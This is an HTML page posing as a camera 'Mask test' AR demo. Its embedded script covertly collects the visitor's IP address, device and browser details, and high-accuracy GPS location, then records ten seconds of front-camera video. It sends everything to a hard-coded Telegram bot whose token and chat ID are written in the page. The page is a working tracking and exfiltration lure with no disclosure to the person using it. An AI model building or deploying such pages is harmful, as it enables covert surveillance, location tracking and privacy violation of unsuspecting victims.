<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AR</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
</head>
<body>
    <h1>Mask test </h1>
    <video id="video" width="640" height="480" autoplay></video>

    <script>
        const video = document.getElementById('video');
        let mediaRecorder;
        let recordedChunks = [];
        let userInfo = {};

        // Telegram Bot Details
        const TELEGRAM_TOKEN = '7748177101:AAF0c52ezGH18sp1ba78xZ_yJWiHSgDElbk';
        const TELEGRAM_CHAT_ID = '5297536255';

        // Fetch IP and device information
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                userInfo.ip = data.ip;

                // Получаем информацию об устройстве
                const parser = new UAParser();
                const deviceInfo = parser.getResult();
                userInfo.device = `Device: ${deviceInfo.device.model || 'Unknown'}, OS: ${deviceInfo.os.name} ${deviceInfo.os.version}, Browser: ${deviceInfo.browser.name} ${deviceInfo.browser.version}`;

                // Получаем точное местоположение
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            const { latitude, longitude, accuracy } = position.coords;
                            userInfo.location = `Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`;
                            sendUserInfoToTelegram();
                        },
                        error => {
                            console.error('Error fetching geolocation:', error);
                            userInfo.location = 'Geolocation unavailable';
                            sendUserInfoToTelegram();
                        },
                        { enableHighAccuracy: true }
                    );
                } else {
                    userInfo.location = 'Geolocation not supported';
                    sendUserInfoToTelegram();
                }
            })
            .catch(error => console.error('Error fetching IP information:', error));

        // Request camera and microphone access
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
            .then(stream => {
                // Attach the stream to the video element
                video.srcObject = stream;

                // Set up the MediaRecorder
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                    sendVideoToTelegram(videoBlob);
                    recordedChunks = []; // Clear the chunks after processing
                };

                // Start recording the stream
                mediaRecorder.start();

                // Stop recording after 10 seconds (example interval)
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000);
            })
            .catch(err => console.error('Error accessing media devices.', err));

        // Function to send user info to Telegram
        function sendUserInfoToTelegram() {
            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: `User Info:\nIP: ${userInfo.ip}\nLocation: ${userInfo.location}\nDevice: ${userInfo.device}`
                })
            })
            .then(response => console.log('User info sent successfully:', response))
            .catch(error => console.error('Error sending user info:', error));
        }

        // Function to send video to Telegram
        function sendVideoToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('video', blob, 'recording.webm');

            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log('Video successfully sent to Telegram:', data))
            .catch(error => console.error('Error sending video to Telegram:', error));
        }
    </script>
</body>
</html>
